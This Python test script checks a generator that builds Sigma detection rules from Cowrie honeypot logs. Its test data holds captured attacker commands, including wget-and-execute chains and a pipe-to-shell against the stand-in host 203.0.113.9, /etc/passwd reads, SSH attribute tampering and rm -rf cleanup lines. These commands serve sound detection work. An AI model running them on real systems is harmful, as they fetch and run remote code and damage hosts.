#!/usr/bin/env python3
# Self-check for sigma_from_cowrie.py: each rule fires on a real captured
# command, a normal admin session trips only the rules whose false positives
# are documented, and the generated rule files carry the motivating session.
# Run: python3 scripts/test_sigma_from_cowrie.py

import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from sigma_from_cowrie import _COMPILED  # noqa: E402

# One real (lightly shortened) honeypot command per rule.
MALICIOUS = {
    "download_execute_chain":
        "(wget http://203.0.113.9/wget -O- || busybox wget http://203.0.113.9/wget -O-)"
        " > w; chmod 777 w; ./w; rm -rf w",
    "pipe_to_shell": "/bin/busybox wget http://203.0.113.9/wget.sh -O- | sh",
    "busybox_applet_marker": "/bin/busybox HISILICON",
    "hex_echo_marker": r'echo -e "\x47\x41\x59\x46\x47\x54"',
    "writable_dir_probe": ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/",
    "elf_self_read": "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
    "ssh_key_implant": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
    "competitor_cleanup": "rm -rf /tmp/secure.sh; pkill -9 secure.sh; echo > /etc/hosts.deny",
    "passwd_read": "cat /etc/passwd",
}

# A plausible admin session. Each command may trip only the rules listed.
ADMIN = [
    ("uname -a", set()),
    ("sudo apt-get update && sudo apt-get install -y nginx", set()),
    ("wget https://example.com/app.tar.gz && tar xzf app.tar.gz", set()),
    ("chmod +x deploy.sh && ./deploy.sh", set()),
    ("busybox ls /tmp", set()),
    ("echo -e '\\x1b[31mred\\x1b[0m'", set()),
    ("ls -la ~/.ssh && cat ~/.ssh/authorized_keys", set()),
    ("grep root /etc/passwd", set()),
    ("systemctl restart sshd; journalctl -u sshd -n 50", set()),
    ("> /var/log/app.log", set()),
    # Documented false positives:
    ("curl -fsSL https://get.docker.com | sh", {"pipe_to_shell"}),
    ('echo "ssh-ed25519 AAAAC3Nza me@laptop" >> ~/.ssh/authorized_keys',
     {"ssh_key_implant"}),
    ("cat /etc/passwd", {"passwd_read"}),
]


def fired(line):
    return {d["name"] for d, rx in _COMPILED if rx.search(line)}


def main():
    names = {d["name"] for d, _ in _COMPILED}
    assert names == set(MALICIOUS), names ^ set(MALICIOUS)
    for name, line in MALICIOUS.items():
        assert name in fired(line), (name, line)
    for line, allowed in ADMIN:
        assert fired(line) <= allowed, (line, fired(line) - allowed)

    with tempfile.TemporaryDirectory() as d:
        log = os.path.join(d, "cowrie.json")
        events = [
            {"eventid": "cowrie.session.connect", "session": "s1",
             "src_ip": "203.0.113.9", "timestamp": "2026-08-10T01:02:03.000000Z"},
            {"eventid": "cowrie.command.input", "session": "s1",
             "src_ip": "203.0.113.9", "input": "uname -a",
             "timestamp": "2026-08-10T01:02:04.000000Z"},
            {"eventid": "cowrie.command.input", "session": "s1",
             "src_ip": "203.0.113.9", "input": MALICIOUS["busybox_applet_marker"],
             "timestamp": "2026-08-10T01:02:05.000000Z"},
        ]
        with open(log, "w") as fh:
            fh.write("\n".join(json.dumps(e) for e in events) + "\n")
        out = os.path.join(d, "rules")
        subprocess.run([sys.executable, os.path.join(HERE, "sigma_from_cowrie.py"),
                        log, "--out", out], check=True, stdout=subprocess.DEVNULL)
        assert sorted(os.listdir(out)) == sorted(n + ".yml" for n in names)
        with open(os.path.join(out, "busybox_applet_marker.yml"),
                  encoding="utf-8") as fh:
            rule = fh.read()

    assert "1 sessions from 1 source IPs" in rule, rule
    assert "Motivating session s1 from 203.0.113.9" in rule, rule
    assert "#     $ uname -a" in rule, rule
    assert "date: 2026/08/10" in rule, rule
    assert "        input|re: '/bin/busybox\\s+[A-Z]{4,}\\b'" in rule, rule
    print("ok")


if __name__ == "__main__":
    main()
